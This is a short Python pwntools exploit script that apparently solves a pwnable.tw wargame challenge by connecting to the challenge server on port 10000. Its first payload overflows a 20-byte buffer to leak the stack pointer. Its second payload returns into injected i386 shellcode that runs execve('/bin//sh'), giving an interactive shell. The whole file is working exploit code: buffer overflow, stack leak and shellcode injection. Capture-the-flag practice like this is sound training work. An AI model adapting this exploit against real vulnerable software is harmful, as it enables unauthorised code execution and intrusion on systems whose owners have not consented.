from pwn import *

def solve():

    # Start connection
    target = remote("chall.pwnable.tw", 10000)

    # First payload to leak the stack pointer
    payload = b'A'*20 + p32(0x08048087);
    target.sendafter(b":", payload)
    esp = u32(target.recv()[:4])
    print("ESP Found: ", hex(esp))

    # Create the shell bytes and payload
    shell = asm(shellcraft.i386.execve("/bin//sh"))
    payload2 = b'A'*20 + p32(esp+20) + shell
    target.send(payload2)
    target.interactive()

if __name__ == "__main__":
    solve()
